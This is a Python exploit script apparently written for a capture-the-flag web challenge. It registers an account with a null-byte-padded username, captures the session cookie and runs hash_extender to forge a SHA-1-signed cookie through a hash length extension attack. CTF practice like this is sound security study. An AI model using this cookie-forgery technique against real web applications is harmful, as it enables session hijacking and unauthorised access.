# hello

import pycurl
import re
import os, sys
from urllib.parse import urlencode

#sys.path.append('./site-packages/')

from functions import timeout_command_ex

URL_REGISTER = 'http://stickitup.chall.malicecyber.com/register.php'
URL_LOGIN = 'http://stickitup.chall.malicecyber.com/login.php'
BINPATH = './bin/macos/'
MAXLEN = 369

SESSION = ''

def _write_header1(header):
    global SESSION
    match = re.match("^Set-Cookie: (.*)$", header.decode('utf-8'))
    if match:
        SESSION = match.group(1)
        #ret = match.group(1)[10:].split(';')[0]
        print("Register Cookie: {}".format(SESSION))

def _write_header2(header):
    match = re.match("^Set-Cookie: (.*)$", header.decode('utf-8'))
    if match:
        ret = match.group(1)[10:].split(';')[0]
        print(ret)

def main():
    DATA  = []
    for _ in range(0, MAXLEN):
        DATA.append(b'\x00')
    DATA = [b'\x41'] + DATA

    print("Register Size: {}".format(MAXLEN))
    print("Register Username: {}".format(b"".join(DATA).decode('utf-8')))
    params = {
        'alias': b"".join(DATA).decode('utf-8'),
        'email': 'aaaaaaaaaaaa@b.com',
        'password': 'aaaa'
    }
    c = pycurl.Curl() 
    c.setopt(pycurl.URL, URL_REGISTER + '?' + urlencode(params))
    c.setopt(pycurl.FOLLOWLOCATION, 1 )
    c.setopt(pycurl.HEADERFUNCTION, _write_header1)
    c.setopt(pycurl.WRITEFUNCTION, lambda x: None)
    c.setopt(pycurl.HTTPHEADER, [
        'Accept-Language: fr-fr', 
        'Upgrade-Insecure-Requests: 1', 
        'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15', 
        'Content-Type: application/x-www-form-urlencoded',
        'X-Requested-With: XMLHttpRequest'
    ])
    c.perform() 
    status = c.getinfo(pycurl.HTTP_CODE)
    print("Register Status: {}".format(status)) 

    print("Login Size: {}".format(MAXLEN))
    params = {
        'email': 'aaaaaaaaaaaa@b.com',
        'password': 'aaaa'
    }
    c.setopt(pycurl.URL, URL_LOGIN + '?' + urlencode(params))
    c.setopt(pycurl.FOLLOWLOCATION, 1 )
    c.setopt(pycurl.HEADERFUNCTION, _write_header2)
    c.setopt(pycurl.HTTPHEADER, [
        'Accept-Language: fr-fr', 
        'Upgrade-Insecure-Requests: 1', 
        'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15', 
        'Content-Type: application/x-www-form-urlencoded',
        'X-Requested-With: XMLHttpRequest',
        'Set-Cookie: ' + SESSION
    ])
    c.perform()
    status = c.getinfo(pycurl.HTTP_CODE)
    print("Login Status: {}".format(status)) 
    c.close()

    SECRET_MIN = '6'
    SECRET_MAX = '10'

    padding = "padding"
    signature = "f43760216936bd41f4a9b91659b6e9820cc840a7" # get from pycurl cookie on login

    cmd = [
        os.path.join(BINPATH, 'hash_extender'),
        '--data', f'{DATA}',
        '--secret-min', SECRET_MIN,
        '--secret-max', SECRET_MAX,
        '--append', f'{padding}',
        '--signature',  f'{signature}',
        '--format', 'sha1',
        '--out-data-format=hex',
        '--out-signature-format=hex',
        #'--quiet'
    ]

    _, ret, data = timeout_command_ex(cmd, 10)
    print("HashExtender Status: {}".format(ret))
    for line in data.decode().strip().splitlines():
        print(line)

if __name__ == "__main__":
    main()